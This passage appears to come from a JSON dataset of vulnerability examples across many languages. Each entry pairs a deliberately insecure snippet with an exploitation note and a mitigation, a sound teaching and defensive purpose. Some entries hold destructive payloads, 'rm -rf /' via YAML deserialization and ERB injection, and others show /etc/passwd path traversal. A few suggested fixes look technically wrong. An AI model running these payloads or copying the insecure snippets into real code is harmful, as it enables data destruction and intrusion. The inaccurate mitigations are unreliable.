  "exploitation_techniques": "Long repeating input.",
  "mitigation": "Use re2 or simplify regex."
}
{
  "id": "vuln-184",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex causing backtracking.",
  "code_snippet": "Regex.IsMatch(input, @\"^([a-zA-Z0-9]+)*$\");",
  "exploitation_techniques": "Malicious input for DoS.",
  "mitigation": "Use timeout: Regex.Match(input, pattern, RegexOptions.None, TimeSpan.FromSeconds(1))"
}
{
  "id": "vuln-185",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex backtracking issue.",
  "code_snippet": "\"^([a-zA-Z0-9]+)*$\".toRegex().matches(input)",
  "exploitation_techniques": "Long input for backtracking.",
  "mitigation": "Use simpler patterns or timeout."
}
{
  "id": "vuln-186",
  "language": "Scala",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex causing ReDoS.",
  "code_snippet": "val regex = \"^([a-zA-Z0-9]+)*$\".r; regex.findFirstIn(input)",
  "exploitation_techniques": "Malicious input for DoS.",
  "mitigation": "Use RE2 or limit input length."
}
{
  "id": "vuln-187",
  "language": "Rust",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex vulnerable to backtracking.",
  "code_snippet": "use regex::Regex; Regex::new(r\"^([a-zA-Z0-9]+)*$\").unwrap().is_match(&input)",
  "exploitation_techniques": "Long input for DoS.",
  "mitigation": "Use fancy-regex or limit input."
}
{
  "id": "vuln-188",
  "language": "Elixir",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex causing backtracking.",
  "code_snippet": "Regex.match?(~r/^([a-zA-Z0-9]+)*$/, input)",
  "exploitation_techniques": "Long malicious input.",
  "mitigation": "Simplify regex or limit input size."
}
{
  "id": "vuln-189",
  "language": "Perl",
  "vulnerability_type": "Insecure Regex DoS",
  "description": "Regex vulnerable to ReDoS.",
  "code_snippet": "if ($input =~ /^([a-zA-Z0-9]+)*$/) { ... }",
  "exploitation_techniques": "Input aaaaa...aaa!.",
  "mitigation": "Use re::engine::RE2 or limit input."
}
{
  "id": "vuln-190",
  "language": "Node.js",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using eval-like deserialization.",
  "code_snippet": "const obj = eval('(' + input + ')');",
  "exploitation_techniques": "Inject malicious JS code.",
  "mitigation": "Use JSON.parse with try-catch."
}
{
  "id": "vuln-191",
  "language": "Python",
  "vulnerability_type": "Insecure YAML Deserialization",
  "description": "PyYAML load on untrusted input.",
  "code_snippet": "import yaml; obj = yaml.load(input, Loader=yaml.Loader)",
  "exploitation_techniques": "Craft YAML for RCE: !!python/object/apply:os.system ['rm -rf /']",
  "mitigation": "Use yaml.safe_load."
}
{
  "id": "vuln-192",
  "language": "Java",
  "vulnerability_type": "Insecure XML Deserialization",
  "description": "XStream deserialization of untrusted data.",
  "code_snippet": "XStream xstream = new XStream(); Object obj = xstream.fromXML(input);",
  "exploitation_techniques": "Craft XML for RCE via gadget chains.",
  "mitigation": "Use XStream.setupDefaultSecurity(); avoid untrusted input."
}
{
  "id": "vuln-193",
  "language": "PHP",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in sessions.",
  "code_snippet": "$_SESSION['credit_card'] = $_POST['cc'];",
  "exploitation_techniques": "Steal session to access data.",
  "mitigation": "Encrypt: $_SESSION['cc'] = encrypt($_POST['cc'], $key);"
}
{
  "id": "vuln-194",
  "language": "Ruby",
  "vulnerability_type": "Insecure Template Injection",
  "description": "ERB with user input.",
  "code_snippet": "ERB.new(input).result",
  "exploitation_techniques": "<%= system('rm -rf /') %>",
  "mitigation": "Use ERB::Util.html_escape; avoid user templates."
}
{
  "id": "vuln-195",
  "language": "Go",
  "vulnerability_type": "Insecure Session Handling",
  "description": "Predictable session IDs.",
  "code_snippet": "sessionID := fmt.Sprintf(\"%d\", time.Now().UnixNano())",
  "exploitation_techniques": "Guess IDs based on timestamp.",
  "mitigation": "Use crypto/rand for session IDs."
}
{
  "id": "vuln-196",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in session.",
  "code_snippet": "HttpContext.Session.SetString(\"credit_card\", model.CreditCard);",
  "exploitation_techniques": "Session hijacking to access data.",
  "mitigation": "Encrypt: Session.SetString(\"cc\", Encrypt(model.CreditCard, key));"
}
{
  "id": "vuln-197",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Session Handling",
  "description": "Predictable session IDs.",
  "code_snippet": "val sessionId = System.currentTimeMillis().toString()",
  "exploitation_techniques": "Predict IDs based on time.",
  "mitigation": "Use SecureRandom for session IDs."
}
{
  "id": "vuln-198",
  "language": "Scala",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Sensitive data in session.",
  "code_snippet": "session.put(\"credit_card\", params(\"cc\"))",
  "exploitation_techniques": "Steal session to access data.",
  "mitigation": "Encrypt session data with AES."
}
{
  "id": "vuln-199",
  "language": "Rust",
  "vulnerability_type": "Insecure Session Handling",
  "description": "Predictable session IDs.",
  "code_snippet": "let session_id = format!(\"{}\", SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos());",
  "exploitation_techniques": "Guess IDs based on timestamp.",
  "mitigation": "Use rand::crypto::SystemRandom for IDs."
}
{
  "id": "vuln-200",
  "language": "Elixir",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Sensitive data in session.",
  "code_snippet": "put_session(conn, :credit_card, params[:cc])",
  "exploitation_techniques": "Hijack session to access data.",
  "mitigation": "Encrypt: put_session(conn, :cc, encrypt(params[:cc]))"
}
{
  "id": "vuln-201",
  "language": "Perl",
  "vulnerability_type": "Insecure Session Handling",
  "description": "Predictable session IDs.",
  "code_snippet": "my $session_id = time();",
  "exploitation_techniques": "Predict IDs based on time.",
  "mitigation": "Use Crypt::Random::Source for IDs."
}
{
  "id": "vuln-202",
  "language": "Node.js",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options header.",
  "code_snippet": "app.get('/', (req, res) => res.send('page'));",
  "exploitation_techniques": "Iframe site to trick clicks.",
  "mitigation": "Use helmet: app.use(helmet.frameguard({ action: 'DENY' }));"
}
{
  "id": "vuln-203",
  "language": "Python",
  "vulnerability_type": "Clickjacking",
  "description": "Missing X-Frame-Options.",
  "code_snippet": "@app.route('/') def index(): return 'page'",
  "exploitation_techniques": "Iframe to capture clicks.",
  "mitigation": "app.config['X_FRAME_OPTIONS'] = 'DENY'"
}
{
  "id": "vuln-204",
  "language": "Java",
  "vulnerability_type": "Clickjacking",
  "description": "No frame protection.",
  "code_snippet": "@GetMapping(\"/\") public String index() { return \"page\"; }",
  "exploitation_techniques": "Iframe for clickjacking.",
  "mitigation": "response.setHeader(\"X-Frame-Options\", \"DENY\");"
}
{
  "id": "vuln-205",
  "language": "PHP",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options header.",
  "code_snippet": "echo 'page';",
  "exploitation_techniques": "Iframe to trick user clicks.",
  "mitigation": "header('X-Frame-Options: DENY');"
}
{
  "id": "vuln-206",
  "language": "Ruby",
  "vulnerability_type": "Clickjacking",
  "description": "No frame protection.",
  "code_snippet": "get '/' do 'page' end",
  "exploitation_techniques": "Iframe for clickjacking.",
  "mitigation": "response.headers['X-Frame-Options'] = 'DENY'"
}
{
  "id": "vuln-207",
  "language": "Go",
  "vulnerability_type": "Clickjacking",
  "description": "Missing X-Frame-Options.",
  "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, \"page\") })",
  "exploitation_techniques": "Iframe attack.",
  "mitigation": "w.Header().Set(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-208",
  "language": "C# (.NET)",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options.",
  "code_snippet": "[HttpGet(\"/\")] public IActionResult Index() { return Content(\"page\"); }",
  "exploitation_techniques": "Iframe to capture clicks.",
  "mitigation": "Response.Headers.Add(\"X-Frame-Options\", \"DENY\");"
}
{
  "id": "vuln-209",
  "language": "Kotlin",
  "vulnerability_type": "Clickjacking",
  "description": "No frame protection.",
  "code_snippet": "get(\"/\") { call.respondText(\"page\") }",
  "exploitation_techniques": "Iframe attack.",
  "mitigation": "call.response.header(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-210",
  "language": "Scala",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options.",
  "code_snippet": "get(\"/\") { Ok(\"page\") }",
  "exploitation_techniques": "Iframe to trick clicks.",
  "mitigation": "response.header(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-211",
  "language": "Rust",
  "vulnerability_type": "Clickjacking",
  "description": "No frame protection.",
  "code_snippet": "router.get(\"/\", |_, res| res.render_text(\"page\"))",
  "exploitation_techniques": "Iframe attack.",
  "mitigation": "res.header(header::X_FRAME_OPTIONS, \"DENY\")"
}
{
  "id": "vuln-212",
  "language": "Elixir",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options.",
  "code_snippet": "get \"/\", PageController, :index",
  "exploitation_techniques": "Iframe for clickjacking.",
  "mitigation": "put_resp_header(conn, \"x-frame-options\", \"DENY\")"
}
{
  "id": "vuln-213",
  "language": "Perl",
  "vulnerability_type": "Clickjacking",
  "description": "No frame protection.",
  "code_snippet": "$r->print('page');",
  "exploitation_techniques": "Iframe to capture clicks.",
  "mitigation": "$r->header_out('X-Frame-Options', 'DENY');"
}
{
  "id": "vuln-214",
  "language": "Node.js",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Multiple parameters with same name.",
  "code_snippet": "const value = req.query.param; db.query(value);",
  "exploitation_techniques": "?param=1&param=2 to confuse logic.",
  "mitigation": "Use first value: req.query.param[0] or validate."
}
{
  "id": "vuln-215",
  "language": "Python",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Handling multiple query params.",
  "code_snippet": "value = request.args.get('param'); db.execute(value)",
  "exploitation_techniques": "?param=1&param=2 to bypass checks.",
  "mitigation": "Use request.args.get('param', single=True)"
}
{
  "id": "vuln-216",
  "language": "Java",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Unvalidated multiple params.",
  "code_snippet": "String param = request.getParameter(\"param\"); db.query(param);",
  "exploitation_techniques": "?param=1&param=2 to alter logic.",
  "mitigation": "Use getParameterValues and take first."
}
{
  "id": "vuln-217",
  "language": "PHP",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Multiple query params.",
  "code_snippet": "$value = $_GET['param']; $db->query($value);",
  "exploitation_techniques": "?param=1&param=2 to confuse app.",
  "mitigation": "Use array_key_first($_GET['param'])"
}
{
  "id": "vuln-218",
  "language": "Ruby",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Unvalidated params.",
  "code_snippet": "value = params[:param]; User.where(value: value)",
  "exploitation_techniques": "?param=1&param=2 to manipulate.",
  "mitigation": "Use params[:param].first"
}
{
  "id": "vuln-219",
  "language": "Go",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Multiple query params.",
  "code_snippet": "value := r.URL.Query().Get(\"param\"); db.Query(value)",
  "exploitation_techniques": "?param=1&param=2 to bypass.",
  "mitigation": "Use r.URL.Query()[\"param\"][0]"
}
{
  "id": "vuln-220",
  "language": "C# (.NET)",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Unvalidated query params.",
  "code_snippet": "var value = Request.Query[\"param\"]; db.Execute(value);",
  "exploitation_techniques": "?param=1&param=2 to confuse.",
  "mitigation": "Use Request.Query[\"param\"].First()"
}
{
  "id": "vuln-221",
  "language": "Kotlin",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Multiple params not handled.",
  "code_snippet": "val value = call.request.queryParameters[\"param\"]; db.query(value)",
  "exploitation_techniques": "?param=1&param=2",
  "mitigation": "Use queryParameters.values(\"param\")?.first()"
}
{
  "id": "vuln-222",
  "language": "Scala",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Unvalidated params.",
  "code_snippet": "val value = params(\"param\"); db.query(value)",
  "exploitation_techniques": "?param=1&param=2",
  "mitigation": "Use params.getAll(\"param\").head"
}
{
  "id": "vuln-223",
  "language": "Rust",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Multiple query params.",
  "code_snippet": "let value = req.query(\"param\")?; db.query(&value);",
  "exploitation_techniques": "?param=1&param=2",
  "mitigation": "Use req.query::<Vec<String>>(\"param\")?.first()"
}
{
  "id": "vuln-224",
  "language": "Elixir",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Unvalidated query params.",
  "code_snippet": "value = params[\"param\"]; Repo.query(value)",
  "exploitation_techniques": "?param=1&param=2",
  "mitigation": "Use Map.get(params, \"param\", :first)"
}
{
  "id": "vuln-225",
  "language": "Perl",
  "vulnerability_type": "HTTP Parameter Pollution",
  "description": "Multiple params not handled.",
  "code_snippet": "my $value = $r->param('param'); $dbh->do($value);",
  "exploitation_techniques": "?param=1&param=2",
  "mitigation": "Use $r->param('param', 'first')"
}
{
  "id": "vuln-226",
  "language": "Node.js",
  "vulnerability_type": "Insecure CORS",
  "description": "Overly permissive CORS policy.",
  "code_snippet": "app.use(cors({ origin: true }));",
  "exploitation_techniques": "Cross-origin requests from malicious sites.",
  "mitigation": "Specify origins: cors({ origin: 'https://trusted.com' })"
}
{
  "id": "vuln-227",
  "language": "Python",
  "vulnerability_type": "Insecure CORS",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "CORS(app, resources={r\"/*\": {\"origins\": \"*\"}})",
  "exploitation_techniques": "Malicious site makes requests.",
  "mitigation": "CORS(app, resources={r\"/*\": {\"origins\": \"https://trusted.com\"}})"
}
{
  "id": "vuln-228",
  "language": "Java",
  "vulnerability_type": "Insecure CORS",
  "description": "Permissive CORS configuration.",
  "code_snippet": "@CrossOrigin(origins = \"*\") @GetMapping(\"/data\") public Data getData() {...}",
  "exploitation_techniques": "Cross-origin data access.",
  "mitigation": "@CrossOrigin(origins = \"https://trusted.com\")"
}
{
  "id": "vuln-229",
  "language": "PHP",
  "vulnerability_type": "Insecure CORS",
  "description": "Allowing all origins.",
  "code_snippet": "header('Access-Control-Allow-Origin: *');",
  "exploitation_techniques": "Malicious site requests.",
  "mitigation": "header('Access-Control-Allow-Origin: https://trusted.com');"
}
{
  "id": "vuln-230",
  "language": "Ruby",
  "vulnerability_type": "Insecure CORS",
  "description": "Permissive CORS policy.",
  "code_snippet": "headers['Access-Control-Allow-Origin'] = '*'",
  "exploitation_techniques": "Cross-origin attacks.",
  "mitigation": "headers['Access-Control-Allow-Origin'] = 'https://trusted.com'"
}
{
  "id": "vuln-231",
  "language": "Go",
  "vulnerability_type": "Insecure CORS",
  "description": "Permissive CORS configuration allowing all origins.",
  "code_snippet": "w.Header().Set(\"Access-Control-Allow-Origin\", \"*\")",
  "exploitation_techniques": "Malicious sites perform cross-origin requests.",
  "mitigation": "Set specific origin: w.Header().Set(\"Access-Control-Allow-Origin\", \"https://trusted.com\")"
}
{
  "id": "vuln-232",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure CORS",
  "description": "Allowing all origins in CORS policy.",
  "code_snippet": "app.UseCors(builder => builder.AllowAnyOrigin());",
  "exploitation_techniques": "Cross-origin data theft from malicious sites.",
  "mitigation": "Specify origins: builder.WithOrigins(\"https://trusted.com\")"
}
{
  "id": "vuln-233",
  "language": "Kotlin",
  "vulnerability_type": "Insecure CORS",
  "description": "Permissive CORS settings in Ktor.",
  "code_snippet": "install(CORS) { anyHost() }",
  "exploitation_techniques": "Malicious cross-origin requests.",
  "mitigation": "Configure: host(\"trusted.com\", schemes = listOf(\"https\"))"
}
{
  "id": "vuln-234",
  "language": "Scala",
  "vulnerability_type": "Insecure CORS",
  "description": "Allowing all origins in Play Framework.",
  "code_snippet": "response.setHeader(\"Access-Control-Allow-Origin\", \"*\")",
  "exploitation_techniques": "Cross-origin attacks from untrusted sites.",
  "mitigation": "Set: response.setHeader(\"Access-Control-Allow-Origin\", \"https://trusted.com\")"
}
{
  "id": "vuln-235",
  "language": "Rust",
  "vulnerability_type": "Insecure CORS",
  "description": "Permissive CORS headers.",
  "code_snippet": "res.header(header::ACCESS_CONTROL_ALLOW_ORIGIN, \"*\")",
  "exploitation_techniques": "Malicious sites access resources.",
  "mitigation": "Use: res.header(header::ACCESS_CONTROL_ALLOW_ORIGIN, \"https://trusted.com\")"
}
{
  "id": "vuln-236",
  "language": "Elixir",
  "vulnerability_type": "Insecure CORS",
  "description": "Allowing all origins in Phoenix.",
  "code_snippet": "plug CORSPlug, origin: \"*\"",
  "exploitation_techniques": "Cross-origin requests from malicious sites.",
  "mitigation": "Set: plug CORSPlug, origin: [\"https://trusted.com\"]"
}
{
  "id": "vuln-237",
  "language": "Perl",
  "vulnerability_type": "Insecure CORS",
  "description": "Permissive CORS headers.",
  "code_snippet": "$r->header_out('Access-Control-Allow-Origin', '*');",
  "exploitation_techniques": "Cross-origin data access.",
  "mitigation": "$r->header_out('Access-Control-Allow-Origin', 'https://trusted.com');"
}
{
  "id": "vuln-238",
  "language": "Node.js",
  "vulnerability_type": "Broken Access Control",
  "description": "No authorization checks for sensitive endpoints.",
  "code_snippet": "app.get('/admin', (req, res) => res.send('Admin Panel'));",
  "exploitation_techniques": "Access /admin without auth.",
  "mitigation": "Check role: if (req.user.role === 'admin') res.send('Admin Panel'); else res.status(403);"
}
{
  "id": "vuln-239",
  "language": "Python",
  "vulnerability_type": "Broken Access Control",
  "description": "No permission checks for restricted routes.",
  "code_snippet": "@app.route('/admin') def admin(): return 'Admin Panel'",
  "exploitation_techniques": "Directly access /admin.",
  "mitigation": "Check: if current_user.is_admin(): return 'Admin Panel'; else: abort(403)"
}
{
  "id": "vuln-240",
  "language": "Java",
  "vulnerability_type": "Broken Access Control",
  "description": "Missing role-based access checks.",
  "code_snippet": "@GetMapping(\"/admin\") public String admin() { return \"Admin Panel\"; }",
  "exploitation_techniques": "Access /admin without authorization.",
  "mitigation": "@PreAuthorize(\"hasRole('ADMIN')\")"
}
{
  "id": "vuln-241",
  "language": "PHP",
  "vulnerability_type": "Broken Access Control",
  "description": "No access control for admin routes.",
  "code_snippet": "if ($_SERVER['REQUEST_URI'] === '/admin') { echo 'Admin Panel'; }",
  "exploitation_techniques": "Visit /admin directly.",
  "mitigation": "Check: if ($user->isAdmin()) { echo 'Admin Panel'; } else { http_response_code(403); }"
}
{
  "id": "vuln-242",
  "language": "Ruby",
  "vulnerability_type": "Broken Access Control",
  "description": "No authorization for sensitive actions.",
  "code_snippet": "get '/admin' do 'Admin Panel' end",
  "exploitation_techniques": "Access /admin without checks.",
  "mitigation": "before { redirect '/' unless current_user.admin? }"
}
{
  "id": "vuln-243",
  "language": "Go",
  "vulnerability_type": "Broken Access Control",
  "description": "No role checks for restricted endpoint.",
  "code_snippet": "http.HandleFunc(\"/admin\", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, \"Admin Panel\") })",
  "exploitation_techniques": "Directly access /admin.",
  "mitigation": "Check: if user.Role == \"admin\" { fmt.Fprint(w, \"Admin Panel\") } else { http.Error(w, \"Forbidden\", 403) }"
}
{
  "id": "vuln-244",
  "language": "C# (.NET)",
  "vulnerability_type": "Broken Access Control",
  "description": "Missing authorization for admin endpoint.",
  "code_snippet": "[HttpGet(\"admin\")] public IActionResult Admin() { return Ok(\"Admin Panel\"); }",
  "exploitation_techniques": "Access /admin without auth.",
  "mitigation": "[Authorize(Roles = \"Admin\")]"
}
{
  "id": "vuln-245",
  "language": "Kotlin",
  "vulnerability_type": "Broken Access Control",
  "description": "No role-based access control.",
  "code_snippet": "get(\"/admin\") { call.respondText(\"Admin Panel\") }",
  "exploitation_techniques": "Directly access /admin.",
  "mitigation": "Check: if (call.principal<UserPrincipal>()?.role == \"admin\") { call.respondText(\"Admin Panel\") } else { call.respond(HttpStatusCode.Forbidden) }"
}
{
  "id": "vuln-246",
  "language": "Scala",
  "vulnerability_type": "Broken Access Control",
  "description": "No authorization checks.",
  "code_snippet": "get(\"/admin\") { Ok(\"Admin Panel\") }",
  "exploitation_techniques": "Access /admin without permission.",
  "mitigation": "Check: if (user.isAdmin) Ok(\"Admin Panel\") else Status(403)"
}
{
  "id": "vuln-247",
  "language": "Rust",
  "vulnerability_type": "Broken Access Control",
  "description": "No access control for sensitive route.",
  "code_snippet": "router.get(\"/admin\", |_, res| res.render_text(\"Admin Panel\"))",
  "exploitation_techniques": "Directly access /admin.",
  "mitigation": "Check: if user.role == \"admin\" { res.render_text(\"Admin Panel\") } else { res.status(StatusCode::FORBIDDEN) }"
}
{
  "id": "vuln-248",
  "language": "Elixir",
  "vulnerability_type": "Broken Access Control",
  "description": "No permission checks for admin route.",
  "code_snippet": "get \"/admin\", AdminController, :index",
  "exploitation_techniques": "Access /admin directly.",
  "mitigation": "plug :check_admin; def check_admin(conn, _) do if conn.assigns[:user].admin, do: conn, else: halt(conn)"
}
{
  "id": "vuln-249",
  "language": "Perl",
  "vulnerability_type": "Broken Access Control",
  "description": "No authorization for admin page.",
  "code_snippet": "if ($r->uri eq '/admin') { $r->print('Admin Panel'); }",
  "exploitation_techniques": "Visit /admin without auth.",
  "mitigation": "Check: $r->print('Admin Panel') if $user->is_admin; else $r->status(403);"
}
{
  "id": "vuln-250",
  "language": "Node.js",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "const resetToken = user.id + Date.now();",
  "exploitation_techniques": "Guess token using user ID and timestamp.",
  "mitigation": "Use crypto.randomBytes(32).toString('hex') for tokens."
}
{
  "id": "vuln-251",
  "language": "Python",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "reset_token = f'{user.id}{int(time.time())}'",
  "exploitation_techniques": "Predict token based on ID and time.",
  "mitigation": "Use secrets.token_urlsafe(32)"
}
{
  "id": "vuln-252",
  "language": "Java",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "String resetToken = user.getId() + System.currentTimeMillis();",
  "exploitation_techniques": "Guess token using ID and time.",
  "mitigation": "Use SecureRandom to generate 32-byte token."
}
{
  "id": "vuln-253",
  "language": "PHP",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "$reset_token = $user_id . time();",
  "exploitation_techniques": "Predict token with user ID and timestamp.",
  "mitigation": "Use random_bytes(32) and bin2hex."
}
{
  "id": "vuln-254",
  "language": "Ruby",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "reset_token = \"#{user.id}#{Time.now.to_i}\"",
  "exploitation_techniques": "Guess token based on ID and time.",
  "mitigation": "Use SecureRandom.urlsafe_base64(32)"
}
{
  "id": "vuln-255",
  "language": "Go",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "resetToken := fmt.Sprintf(\"%d%d\", user.ID, time.Now().Unix())",
  "exploitation_techniques": "Predict token using ID and time.",
  "mitigation": "Use crypto/rand to generate 32-byte token."
}
{
  "id": "vuln-256",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "var resetToken = user.Id + DateTime.Now.Ticks;",
  "exploitation_techniques": "Guess token with ID and timestamp.",
  "mitigation": "Use RNGCryptoServiceProvider for random token."
}
{
  "id": "vuln-257",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "val resetToken = \"${user.id}${System.currentTimeMillis()}\"",
  "exploitation_techniques": "Predict token using ID and time.",
  "mitigation": "Use SecureRandom for 32-byte token."
}
{
  "id": "vuln-258",
  "language": "Scala",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "val resetToken = s\"${user.id}${System.currentTimeMillis}\"",
  "exploitation_techniques": "Guess token with ID and time.",
  "mitigation": "Use SecureRandom for token generation."
}
{
  "id": "vuln-259",
  "language": "Rust",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "let reset_token = format!(\"{}{}\", user.id, SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs());",
  "exploitation_techniques": "Predict token using ID and time.",
  "mitigation": "Use rand::crypto::SystemRandom for token."
}
{
  "id": "vuln-260",
  "language": "Elixir",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "reset_token = \"#{user.id}#{:os.system_time(:second)}\"",
  "exploitation_techniques": "Guess token with ID and timestamp.",
  "mitigation": "Use :crypto.strong_rand_bytes(32) |> Base.url_encode64()"
}
{
  "id": "vuln-261",
  "language": "Perl",
  "vulnerability_type": "Insecure Password Reset",
  "description": "Predictable reset tokens.",
  "code_snippet": "my $reset_token = $user_id . time();",
  "exploitation_techniques": "Predict token based on ID and time.",
  "mitigation": "Use Crypt::Random::Source for token."
}
{
  "id": "vuln-262",
  "language": "Node.js",
  "vulnerability_type": "Improper Error Handling",
  "description": "Exposing stack traces to users.",
  "code_snippet": "app.get('/', (req, res) => { throw new Error('Test'); });",
  "exploitation_techniques": "Extract sensitive info from stack traces.",
  "mitigation": "Use error middleware: app.use((err, req, res, next) => res.status(500).send('Error'))"
}
{
  "id": "vuln-263",
  "language": "Python",
  "vulnerability_type": "Improper Error Handling",
  "description": "Leaking stack traces in responses.",
  "code_snippet": "@app.route('/') def index(): raise Exception('Test')",
  "exploitation_techniques": "Analyze stack traces for sensitive data.",
  "mitigation": "app.errorhandler(Exception)(lambda e: ('Error', 500))"
}
{
  "id": "vuln-264",
  "language": "Java",
  "vulnerability_type": "Improper Error Handling",
  "description": "Exposing stack traces in response.",
  "code_snippet": "@GetMapping(\"/\") public String index() { throw new RuntimeException(\"Test\"); }",
  "exploitation_techniques": "Extract sensitive info from traces.",
  "mitigation": "@ExceptionHandler(Exception.class) public ResponseEntity<?> handle(Exception e) { return ResponseEntity.status(500).body(\"Error\"); }"
}
{
  "id": "vuln-265",
  "language": "PHP",
  "vulnerability_type": "Improper Error Handling",
  "description": "Displaying PHP errors to users.",
  "code_snippet": "ini_set('display_errors', 1); throw new Exception('Test');",
  "exploitation_techniques": "Extract info from error output.",
  "mitigation": "ini_set('display_errors', 0); set_error_handler(function() { http_response_code(500); echo 'Error'; });"
}
{
  "id": "vuln-266",
  "language": "Ruby",
  "vulnerability_type": "Improper Error Handling",
  "description": "Leaking stack traces.",
  "code_snippet": "get '/' do raise 'Test' end",
  "exploitation_techniques": "Analyze stack traces for secrets.",
  "mitigation": "configure { set :show_exceptions, false }; error { 'Error' }"
}
{
  "id": "vuln-267",
  "language": "Go",
  "vulnerability_type": "Improper Error Handling",
  "description": "Exposing error details.",
  "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { panic(\"Test\") })",
  "exploitation_techniques": "Extract sensitive data from panic output.",
  "mitigation": "Use recover: defer func() { if r := recover(); r != nil { http.Error(w, \"Error\", 500) } }()"
}
{
  "id": "vuln-268",
  "language": "C# (.NET)",
  "vulnerability_type": "Improper Error Handling",
  "description": "Leaking stack traces.",
  "code_snippet": "[HttpGet(\"/\")] public IActionResult Index() { throw new Exception(\"Test\"); }",
  "exploitation_techniques": "Extract info from stack traces.",
  "mitigation": "app.UseExceptionHandler(err => err.Run(async ctx => await ctx.Response.WriteAsync(\"Error\")));"
}
{
  "id": "vuln-269",
  "language": "Kotlin",
  "vulnerability_type": "Improper Error Handling",
  "description": "Exposing stack traces in Ktor.",
  "code_snippet": "get(\"/\") { throw Exception(\"Test\") }",
  "exploitation_techniques": "Analyze stack traces for secrets.",
  "mitigation": "install(StatusPages) { exception<Exception> { call.respond(HttpStatusCode.InternalServerError, \"Error\") } }"
}
{
  "id": "vuln-270",
  "language": "Scala",
  "vulnerability_type": "Improper Error Handling",
  "description": "Leaking stack traces.",
  "code_snippet": "get(\"/\") { throw new Exception(\"Test\") }",
  "exploitation_techniques": "Extract sensitive data from traces.",
  "mitigation": "Action { implicit request => try { ... } catch { case e: Exception => InternalServerError(\"Error\") } }"
}
{
  "id": "vuln-271",
  "language": "Rust",
  "vulnerability_type": "Improper Error Handling",
  "description": "Exposing panic details.",
  "code_snippet": "router.get(\"/\", |_, _| panic!(\"Test\"));",
  "exploitation_techniques": "Extract info from panic output.",
  "mitigation": "Use catch_unwind: std::panic::catch_unwind(|| ...).unwrap_or_else(|_| Err(StatusCode::INTERNAL_SERVER_ERROR))"
}
{
  "id": "vuln-272",
  "language": "Elixir",
  "vulnerability_type": "Improper Error Handling",
  "description": "Leaking error details.",
  "code_snippet": "get \"/\", PageController, :index # raises error",
  "exploitation_techniques": "Analyze error output for secrets.",
  "mitigation": "plug :error_handler; def error_handler(conn, _) do send_resp(conn, 500, \"Error\") end"
}
{
  "id": "vuln-273",
  "language": "Perl",
  "vulnerability_type": "Improper Error Handling",
  "description": "Exposing error messages.",
  "code_snippet": "die \"Test error\";",
  "exploitation_techniques": "Extract sensitive info from errors.",
  "mitigation": "eval { ... }; if ($@) { $r->print('Error'); $r->status(500); }"
}
{
  "id": "vuln-274",
  "language": "Node.js",
  "vulnerability_type": "Insecure File Download",
  "description": "No validation on file downloads.",
  "code_snippet": "res.download(`files/${req.query.file}`);",
  "exploitation_techniques": "Download ../../etc/passwd.",
  "mitigation": "Validate: path.resolve(baseDir, file); check prefix."
}
{
  "id": "vuln-275",
  "language": "Python",
  "vulnerability_type": "Insecure File Download",
  "description": "Serving files with user input.",
  "code_snippet": "return send_file(request.args.get('file'))",
  "exploitation_techniques": "Access ../../etc/passwd.",
  "mitigation": "Use os.path.join(base_dir, file); validate path."
}
{
  "id": "vuln-276",
  "language": "Java",
